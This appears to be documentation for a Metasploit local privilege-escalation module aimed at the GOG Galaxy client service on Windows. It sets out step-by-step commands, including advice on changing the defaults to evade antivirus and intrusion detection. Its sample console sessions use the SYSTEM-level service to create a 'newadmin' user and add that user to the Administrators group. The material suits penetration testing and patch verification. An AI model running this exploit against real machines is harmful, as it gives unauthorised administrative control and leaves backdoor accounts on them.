## Vulnerable Application

GOG Galaxy is a video game management client.  One of its Windows services, *GalaxyClientService*, runs with *SYSTEM* privileges.  In versions 2.0.12 and earlier, and 1.2.64 and earlier, it is possible to communicate with the service and instruct it to execute arbitrary commands as *SYSTEM*.

A vulnerable version need only be installed on the target machine in order to be exploitable.

## Verification Steps

  1. Start *msfconsole*.
  2. Acquire a Meterpreter session.
  3. Do: ```use exploit/windows/local/gog_galaxyclientservice_privesc```
  4. Do: ```set SESSION [insert session number here]```
  5. (Optional) For AV/IDS evasion, modify the default username and password in the ```ARGS``` option.
  6. Do: ```exploit```
  7. Check that the new user is created.
  8. (Optional) To place new user in the local Administrators group, run ```set ARGS "net localgroup Administrators [put username here] /add"``` followed by ```exploit``` again.

## Options

### CMD

The absolute path of the command to execute.

### ARGS

The arguments to pass to the command.

### WORKING_DIR

The initial working directory of the command.

### SESSION

The Meterpreter session number to execute the command in.


## Scenarios
```
> use exploit/windows/local/gog_galaxyclientservice_privesc 
msf5 exploit(windows/local/gog_galaxyclientservice_privesc) > set SESSION 1
SESSION => 1
msf5 exploit(windows/local/gog_galaxyclientservice_privesc) > exploit

[*] Started reverse TCP handler on 10.0.2.18:4444 
[*] Attempting to execute "C:\Windows\System32\net.exe user newadmin 0mg*123L0l /add" with SYSTEM privileges...
[!] Warning: default command & args used.  To better evade AV/IDS, consider customizing these next time.
[*] Starting GalaxyClientService...
[*] Service started successfully.
[*] Connecting to service...
[*] Connected to service.  Sending payload...
[+] Command executed successfully!
[+] Hint: to add the new user to the local Administrators group, set the ARGS option to "net localgroup Administrators [user] /add"
[*] Exploit completed, but no session was created.

msf5 exploit(windows/local/gog_galaxyclientservice_privesc) > set ARGS "net localgroup Administrators newadmin /add"
ARGS => net localgroup Administrators newadmin /add
msf5 exploit(windows/local/gog_galaxyclientservice_privesc) > exploit

[*] Started reverse TCP handler on 10.0.2.18:4444 
[*] Attempting to execute "C:\Windows\System32\net.exe net localgroup Administrators newadmin /add" with SYSTEM privileges...
[*] Starting GalaxyClientService...
[*] Service started successfully.
[*] Connecting to service...
[*] Connected to service.  Sending payload...
[+] Command executed successfully!
[+] Hint: to add the new user to the local Administrators group, set the ARGS option to "net localgroup Administrators [user] /add"
[*] Exploit completed, but no session was created.
```

### Version and OS

This exploit works on the Windows version of GOG Galaxy v1.2.64 and earlier, and v2.0.12 and earlier.
